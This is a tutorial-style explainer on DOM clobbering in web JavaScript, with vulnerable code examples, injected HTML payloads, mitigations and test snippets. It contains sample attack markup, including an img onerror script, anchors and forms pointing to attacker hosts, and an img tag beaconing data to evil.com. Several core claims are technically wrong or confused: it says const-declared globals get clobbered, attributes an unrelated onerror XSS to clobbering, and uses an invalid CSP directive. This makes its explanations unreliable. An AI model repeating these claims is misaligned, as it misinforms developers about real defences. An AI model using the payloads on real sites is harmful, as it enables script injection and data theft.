# DOM Clobbering

## Definition

DOM clobbering is a security vulnerability where an attacker injects HTML elements with specific IDs or names that override JavaScript variables or functions in the global scope. When the browser creates DOM elements with certain names, it automatically creates properties on the `window` object, potentially overwriting legitimate global variables with attacker-controlled HTML elements.

This vulnerability is particularly dangerous because it can bridge the gap between an HTML injection vulnerability (which might seem benign) and actual JavaScript code execution, XSS, or other attacks. Attackers exploit the automatic property creation to override variables that the application relies on for security.

---

## How JavaScript Global Scope and DOM Interact

### Automatic Property Creation from HTML Elements

```javascript
// When HTML contains an element with id="username", JavaScript can access it via:
// 1. document.getElementById('username')
// 2. window.username
// 3. username (global reference)

// Example HTML:
// <div id="username">Alice</div>

// These all work:
console.log(document.getElementById('username')); // <div id="username">
console.log(window.username);                     // <div id="username">
console.log(username);                            // <div id="username">
```

### Named Elements Create Window Properties

```javascript
// Forms and elements with name attributes also create window properties
// <form name="loginForm">
// <input name="password">

// Accessible as:
console.log(window.loginForm);   // <form> element
console.log(window.password);    // <input> element

// Also applies to frames:
// <iframe name="myFrame">
console.log(window.myFrame);     // <iframe> element
```

---

## Concrete Examples of DOM Clobbering

### Example 1: Clobbering a Config Object

**Scenario**: Application relies on a global `config` object for settings. An attacker injects an HTML element that overwrites it.

**Vulnerable code:**

```javascript
// Global config object
const config = {
  apiUrl: 'https://api.example.com',
  apiKey: 'secret-key-12345',
  isProduction: true,
  allowDownload: false
};

// Function that uses config
function downloadFile(fileId) {
  if (!config.allowDownload) {
    console.error('Downloads are disabled');
    return;
  }

  fetch(`${config.apiUrl}/download/${fileId}`, {
    headers: {
      'Authorization': `Bearer ${config.apiKey}`
    }
  });
}

// Application loads some user-provided HTML
const userHTML = `<a id="config" href="https://attacker.com/steal?key=value"></a>`;
document.body.innerHTML += userHTML;

// Now config is clobbered!
console.log(config);        // <a id="config"> element, NOT the original object
console.log(typeof config); // 'object' (HTMLElement is an object)

// When downloadFile is called:
// config.allowDownload is undefined (not false)
// config.apiUrl is undefined (not the real API)
// Downloads can now be allowed (if check is poorly written)
```

**Attack payload:**

```html
<!-- Attacker injects this HTML -->
<a id="config"></a>

<!-- Now in JavaScript:
    config = HTMLAnchorElement
    config.allowDownload = undefined
    config.apiUrl = undefined
    config.apiKey = undefined
-->
```

### Example 2: Clobbering URL Configuration

```javascript
// Application has a redirect configuration
const redirectConfig = {
  redirectUrl: 'https://example.com/dashboard'
};

// Function that redirects based on config
function redirectAfterLogin() {
  window.location.href = redirectConfig.redirectUrl;
}

// Attacker injects HTML
const injected = `
  <a id="redirectConfig" href="https://attacker.com/phishing"></a>
`;
document.body.innerHTML += injected;

// Now redirectConfig is clobbered
console.log(redirectConfig);        // HTMLAnchorElement
console.log(redirectConfig.redirectUrl); // undefined (not the real URL)

// When redirectAfterLogin is called:
// window.location.href = undefined
// Or if code assumes redirectUrl exists:
// window.location.href = redirectConfig.href
// = "https://attacker.com/phishing"
// User is redirected to attacker's site!
```

### Example 3: Clobbering Function References

```javascript
// Application stores references to safe functions
const security = {
  validateInput: (input) => /^[a-zA-Z0-9]+$/.test(input),
  sanitizeHTML: (html) => html.replace(/<[^>]*>/g, ''),
  isUserAdmin: (user) => user.role === 'admin'
};

// Uses them for security checks
function processUserInput(input) {
  if (!security.validateInput(input)) {
    throw new Error('Invalid input');
  }

  const sanitized = security.sanitizeHTML(input);
  return sanitized;
}

// Attacker injects HTML that clobbers security object
const injected = `
  <form id="security">
    <input name="validateInput" value="always-true">
    <input name="sanitizeHTML" value="">
  </form>
`;
document.body.innerHTML += injected;

// Now security is clobbered with the form
console.log(security);                    // HTMLFormElement
console.log(security.validateInput);      // HTMLInputElement (not a function!)
console.log(typeof security.validateInput); // 'object', not 'function'

// When processUserInput is called:
// security.validateInput(input) throws error
// typeof security.validateInput === 'object', not 'function'
// Code expecting a function will crash or bypass validation
```

### Example 4: Clobbering with Form Elements

```javascript
// Application relies on a global token
let csrfToken = 'abc123xyz';

function submitForm(data) {
  // Expects csrfToken to be a string
  const formData = new FormData();
  formData.append('csrf_token', csrfToken);
  formData.append('data', data);

  fetch('/api/submit', { method: 'POST', body: formData });
}

// Attacker injects form with hidden input
const injected = `
  <form id="csrfToken">
    <input type="hidden" name="value" value="attacker-token">
  </form>
`;
document.body.innerHTML += injected;

// csrfToken is now clobbered
console.log(csrfToken);           // HTMLFormElement
console.log(typeof csrfToken);    // 'object'
console.log(csrfToken.value);     // undefined (forms don't have .value)

// When submitForm tries to use csrfToken as a string:
// String(csrfToken) = "[object HTMLFormElement]" (weird, not the real token)
// Or the form gets submitted with the wrong token
// CSRF protection is bypassed!
```

---

## Bridge from HTML Injection to XSS via DOM Clobbering

DOM clobbering becomes particularly dangerous when combined with template engines or frameworks:

```javascript
// Template code that includes user-provided HTML
const userBio = getUserBioFromDatabase(); // Could be injected HTML

const template = `
  <div>
    <h1>User Profile</h1>
    ${userBio}
    <script>
      const config = {
        isDarkMode: false
      };

      function applyTheme() {
        if (config.isDarkMode) {
          document.body.classList.add('dark-mode');
        }
      }

      applyTheme();
    </script>
  </div>
`;

// Attacker's HTML injection payload:
// <img id="config" src=x onerror="alert('XSS via DOM clobbering')">

// Result:
// 1. userBio contains the img element
// 2. config is now clobbered with the img element
// 3. The script tries to access config.isDarkMode
// 4. config is not an object anymore, it's an element
// 5. But the img element has onerror handler that fires
// 6. XSS is achieved!
```

---

## Types of Elements Used in DOM Clobbering

### Anchor Elements
```html
<!-- Creates properties via href/id -->
<a id="myVar" href="https://evil.com"></a>
<!-- window.myVar.href = "https://evil.com" -->
```

### Form Elements
```html
<!-- Forms and inputs create named properties -->
<form id="config" name="settings">
  <input name="apiUrl" value="https://evil.com">
  <input name="apiKey" value="stolen-key">
</form>
<!-- window.config = HTMLFormElement -->
<!-- window.config.apiUrl = HTMLInputElement -->
<!-- window.config.apiKey = HTMLInputElement -->
```

### Image Elements
```html
<!-- Images can execute onerror handlers -->
<img id="loader" src=x onerror="alert('XSS')">
<!-- Also useful for exfiltrating data -->
<img id="tracker" src="https://evil.com/log?data=..." onerror="">
```

### IFrame Elements
```html
<!-- Create contentWindow properties -->
<iframe id="utils" name="helpers"></iframe>
<!-- window.utils points to the iframe -->
```

### Objects and Embeds
```html
<!-- Can load external content -->
<object id="plugin" data="https://evil.com/file"></object>
<embed id="player" src="https://evil.com/media">
```

---

## Vulnerable Code Patterns

### Pattern 1: Trusting Global Variable Existence

```javascript
// VULNERABLE: Assumes config is always the original object
function sendData(data) {
  // No validation that config is what we expect
  fetch(config.apiUrl, {
    headers: { 'Authorization': `Bearer ${config.apiKey}` },
    body: JSON.stringify(data)
  });
}

// Attacker injects: <a id="config"></a>
// Now config is an HTMLElement, not an object
```

### Pattern 2: Missing Null/Type Checks

```javascript
// VULNERABLE: No type checking
function processConfig(data) {
  const url = config.endpoint;  // Could be clobbered
  const opts = config.options;  // Could be clobbered

  // No validation that these are what we expect
  makeRequest(url, opts);
}
```

### Pattern 3: Relying on Property Existence for Security

```javascript
// VULNERABLE: Security decision based on property
if (!config.bypassSecurity) {  // Might be clobbered to undefined
  validateUser();
}

// If config is clobbered:
// config.bypassSecurity = undefined (falsy but not false)
// Might bypass security check depending on how condition is written
```

### Pattern 4: Using Global References in Closures

```javascript
// VULNERABLE: Closure refers to global that could be clobbered
const loginModule = (function() {
  return {
    login: function(user, pass) {
      // References global settings
      fetch(settings.loginUrl, {
        method: 'POST',
        body: JSON.stringify({ user, pass })
      });
    }
  };
})();

// Attacker injects: <form id="settings"><input name="loginUrl"></form>
// Now settings is clobbered
```

---

## Mitigation Strategies

### 1. Avoid Global Variables

```javascript
// INSECURE: Uses global config
const config = { apiUrl: '...' };

// SECURE: Encapsulate in module
const AppModule = (function() {
  const config = { apiUrl: '...' }; // Private, can't be clobbered from HTML

  return {
    sendData: (data) => {
      // Uses private config
      fetch(config.apiUrl, { body: JSON.stringify(data) });
    }
  };
})();

// Even if attacker injects <div id="config">, it won't affect private config
```

### 2. Use Strict Null/Type Checks

```javascript
// SECURE: Validates type before using
function sendData(data) {
  // Verify config is an object with expected structure
  if (typeof config !== 'object' ||
      typeof config.apiUrl !== 'string' ||
      typeof config.apiKey !== 'string') {
    throw new Error('Config is invalid or clobbered');
  }

  fetch(config.apiUrl, {
    headers: { 'Authorization': `Bearer ${config.apiKey}` },
    body: JSON.stringify(data)
  });
}
```

### 3. Store Configuration in Non-Global Objects

```javascript
// SECURE: Attach to Symbol or non-clobberable property
const APP_CONFIG = Symbol('appConfig');
window[APP_CONFIG] = {
  apiUrl: 'https://api.example.com',
  apiKey: 'secret'
};

// Attacker can't clobber this without executing JavaScript
function sendData(data) {
  const config = window[APP_CONFIG];
  // Can't be clobbered by HTML injection
  fetch(config.apiUrl, { body: JSON.stringify(data) });
}
```

### 4. Use WeakMap for Private Storage

```javascript
// SECURE: Use WeakMap for private data
const configStore = new WeakMap();
const appKey = {};

function setConfig(config) {
  configStore.set(appKey, config);
}

function getConfig() {
  return configStore.get(appKey);
}

function sendData(data) {
  const config = getConfig();
  // Can't be accessed or clobbered from HTML
  fetch(config.apiUrl, { body: JSON.stringify(data) });
}
```

### 5. Sanitize User-Provided HTML

```javascript
// SECURE: Remove dangerous attributes and id/name properties
const DOMPurify = require('isomorphic-dompurify');

function displayUserContent(html) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'div', 'span', 'a'],
    ALLOWED_ATTR: ['href'],
    // Remove id and name to prevent clobbering
    KEEP_CONTENT: true
  });

  document.getElementById('content').innerHTML = clean;
}

// Or manually remove id/name attributes
function sanitizeForDisplay(html) {
  const temp = document.createElement('div');
  temp.innerHTML = html;

  // Remove all id and name attributes
  const elements = temp.querySelectorAll('[id], [name]');
  elements.forEach(el => {
    el.removeAttribute('id');
    el.removeAttribute('name');
  });

  return temp.innerHTML;
}
```

### 6. Use Object.freeze for Critical Configuration

```javascript
// SECURE: Freeze configuration to prevent modification
const config = Object.freeze({
  apiUrl: 'https://api.example.com',
  apiKey: 'secret-key',
  allowDownloads: false
});

// Any attempt to modify throws error
config.allowDownloads = true; // TypeError: Cannot assign to read only property

// Even with clobbering, the original config is protected
// (though window.config could still be overwritten)
```

### 7. Validate Configuration Against Schema

```javascript
// SECURE: Use schema validation
const Joi = require('joi');

const configSchema = Joi.object({
  apiUrl: Joi.string().uri().required(),
  apiKey: Joi.string().min(10).required(),
  allowDownloads: Joi.boolean().default(false)
});

function useConfig(providedConfig) {
  const { error, value } = configSchema.validate(providedConfig);

  if (error) {
    throw new Error('Invalid configuration: ' + error.message);
  }

  // Use validated config
  return value;
}

// Even if config is clobbered, validation will catch it
```

### 8. Use Content Security Policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  object-src 'none';
  embed-src 'none';
  frame-src 'self';
```

Restricting which domains can be embedded and which scripts can run limits the effectiveness of DOM clobbering attacks.

---

## Testing for DOM Clobbering Vulnerabilities

```javascript
// Test 1: Try to clobber a known global variable
const testGlobal = { data: 'original' };
const attackHTML = '<div id="testGlobal"></div>';
document.body.innerHTML += attackHTML;

if (typeof testGlobal.data === 'undefined') {
  console.error('VULNERABLE: Variable was clobbered');
}

// Test 2: Inject form and check if properties are accessible
const injectedHTML = `
  <form id="testConfig">
    <input name="apiUrl" value="evil">
    <input name="apiKey" value="stolen">
  </form>
`;
document.body.innerHTML += injectedHTML;

if (window.testConfig && window.testConfig.apiUrl) {
  console.error('VULNERABLE: Form elements clobbered object');
}

// Test 3: Check sensitive globals for correct type
const sensitiveGlobals = ['config', 'settings', 'auth', 'security'];

sensitiveGlobals.forEach(name => {
  if (typeof window[name] !== 'object' || window[name] instanceof Element) {
    console.error(`VULNERABLE: ${name} is clobbered or is a DOM element`);
  }
});
```

---

## Best Practices Checklist

1. **Minimize Global Variables**
   - Encapsulate configuration in modules
   - Use IIFEs or ES6 modules
   - Keep globals out of the global scope

2. **Use Strict Type Checking**
   - Always validate that critical globals are the right type
   - Check `typeof` before using
   - Validate structure with schema libraries

3. **Protect Sensitive Configuration**
   - Use Symbols for storage
   - Use WeakMaps for private data
   - Freeze objects to prevent modification

4. **Sanitize User-Provided HTML**
   - Remove id and name attributes
   - Use DOMPurify or similar
   - Validate HTML before rendering

5. **Implement CSP**
   - Restrict embedded content sources
   - Limit which scripts can execute
   - Use object-src 'none' to block objects/embeds

6. **Use Modern JavaScript Patterns**
   - Prefer ES6 modules to global variables
   - Use closures for private state
   - Leverage weak references when available

7. **Code Review**
   - Review code that references globals
   - Check for type validation
   - Verify configuration immutability

8. **Security Testing**
   - Test with DOM clobbering payloads
   - Inject HTML with common ids/names
   - Verify globals remain unchanged

9. **Monitor at Runtime**
   - Log unexpected changes to critical globals
   - Alert on type mismatches
   - Track configuration integrity

---

## Real-World Examples

- **CVE-2012-3656**: jQuery vulnerability where DOM clobbering could bypass security checks
- **Bypasses in Google Closure Library**: DOM clobbering used to escape sandbox
- **DOM Clobbering in Templating Engines**: Various template engines vulnerable when allowing user HTML input

---

## Related Reading

- OWASP DOM Clobbering
- CWE-79: Improper Neutralization of Input During Web Page Generation
- DOM Clobbering by PortSwigger Web Security Academy
- JavaScript Global Scope and Security Implications
